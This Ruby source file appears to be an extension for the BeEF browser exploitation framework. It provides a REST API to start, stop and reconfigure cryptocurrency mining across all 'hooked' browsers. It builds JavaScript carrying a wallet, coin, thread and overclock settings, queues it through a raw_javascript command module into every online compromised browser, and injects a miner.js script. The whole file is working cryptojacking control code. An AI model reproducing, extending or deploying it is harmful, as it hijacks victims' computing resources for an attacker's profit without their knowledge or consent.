require 'json'

#
# Miner Control REST API
# Manages the global browser-miner state.  Hooked browsers poll
# /hookpages/miner-state (no auth) to receive live config changes.
#
# GET  /api/hookpages/miner              → full config + stats
# PUT  /api/hookpages/miner              → save config
# POST /api/hookpages/miner/start        → start mining on all hooks
# POST /api/hookpages/miner/stop         → stop  mining on all hooks
# POST /api/hookpages/miner/broadcast    → push current config (start if stopped)
#
module BeEF
  module Extension
    module Hookpages
      class MinerControlRest < BeEF::Core::Router::Router
        config = BeEF::Core::Configuration.instance

        before do
          error 401 unless params[:token] == config.get('beef.api_token')
          halt  401 unless BeEF::Core::Rest.permitted_source?(request.ip)
          headers(
            'Content-Type'  => 'application/json; charset=UTF-8',
            'Cache-Control' => 'no-cache',
            'Pragma'        => 'no-cache',
            'Expires'       => '0'
          )
        end

        # ── GET /api/hookpages/miner ─────────────────────────────────────────
        get '/' do
          state = BeEF::Extension::Hookpages.miner_runtime
          { success: true }.merge(state).merge(stats_payload).to_json
        end

        # ── PUT /api/hookpages/miner ─────────────────────────────────────────
        put '/' do
          request.body.rewind
          begin
            body = JSON.parse(request.body.read)
            BeEF::Extension::Hookpages.update_miner_runtime(body)
            state = BeEF::Extension::Hookpages.miner_runtime
            { success: true, message: 'Config updated' }.merge(state).to_json
          rescue JSON::ParserError
            halt 400, { success: false, error: 'Invalid JSON' }.to_json
          end
        end

        # ── POST /api/hookpages/miner/start ──────────────────────────────────
        post '/start' do
          request.body.rewind
          begin
            body = JSON.parse(request.body.read) rescue {}
            BeEF::Extension::Hookpages.update_miner_runtime(body.merge('running' => true))
            broadcast_to_hooks('start')
            { success: true, message: 'Mining started on all online hooks' }.to_json
          end
        end

        # ── POST /api/hookpages/miner/stop ───────────────────────────────────
        post '/stop' do
          BeEF::Extension::Hookpages.update_miner_runtime('running' => false)
          broadcast_to_hooks('stop')
          { success: true, message: 'Mining stopped on all online hooks' }.to_json
        end

        # ── POST /api/hookpages/miner/broadcast ──────────────────────────────
        post '/broadcast' do
          request.body.rewind
          begin
            body = JSON.parse(request.body.read) rescue {}
            BeEF::Extension::Hookpages.update_miner_runtime(body.merge('running' => true))
            count = broadcast_to_hooks('start')
            { success: true, message: "Settings pushed to #{count} hooked browser(s)" }.to_json
          end
        end

        private

        def stats_payload
          online = BeEF::Core::Models::HookedBrowser.where('lastseen > ?', Time.now.to_i - 15).count rescue 0
          { online_miners: online, total_hashes: BeEF::Extension::Hookpages.total_hashes }
        end

        # Injects a JS command into every currently-online hooked browser.
        # Returns the number of browsers targeted.
        def broadcast_to_hooks(action)
          state   = BeEF::Extension::Hookpages.miner_runtime
          mc      = state
          js      = build_broadcast_js(action, mc)
          count   = 0

          online_browsers.each do |hb|
            begin
              execute_js(hb, js)
              count += 1
            rescue => e
              print_error "[hookpages/miner] broadcast failed for #{hb.session}: #{e.message}"
            end
          end
          count
        end

        def online_browsers
          BeEF::Core::Models::HookedBrowser.where('lastseen > ?', Time.now.to_i - 15)
        rescue
          []
        end

        def execute_js(hb, js)
          mod = BeEF::Core::Models::CommandModule.find_by(name: 'raw_javascript')
          return unless mod

          command = BeEF::Core::Models::Command.new(
            hooked_browser_id: hb.id,
            command_module_id: mod.id,
            label:             'miner_broadcast',
            data:              { 'cmd' => js }.to_json,
            createdAt:         Time.now
          )
          command.save!
        end

        def build_broadcast_js(action, mc)
          if action == 'stop'
            <<~JS
              (function() {
                if (window.__beef_miner_worker) {
                  window.__beef_miner_worker.terminate();
                  window.__beef_miner_worker = null;
                }
                window.__beef_miner_running = false;
              })();
            JS
          else
            # Start or update: reconfigure running worker, or start a new one
            <<~JS
              (function() {
                window.BEEF_MINER_CONFIG = {
                  wsProxy:    #{mc[:ws_proxy].to_json},
                  wallet:     #{mc[:wallet].to_json},
                  coin:       #{mc[:coin].to_json},
                  workerName: #{mc[:worker_name].to_json},
                  threads:    #{mc[:threads]},
                  speed:      #{mc[:speed]},
                  overclock:  #{mc[:overclock]}
                };
                // If a worker is already running, post updated config
                if (window.__beef_miner_worker) {
                  window.__beef_miner_worker.postMessage({ type: 'config', config: window.BEEF_MINER_CONFIG });
                } else {
                  // Load miner.js which reads window.BEEF_MINER_CONFIG
                  window.__beef_miner_running = false;
                  var s = document.createElement('script');
                  s.src = '/miner/miner.js?t=' + Date.now();
                  document.head.appendChild(s);
                }
              })();
            JS
          end
        end
      end
    end
  end
end
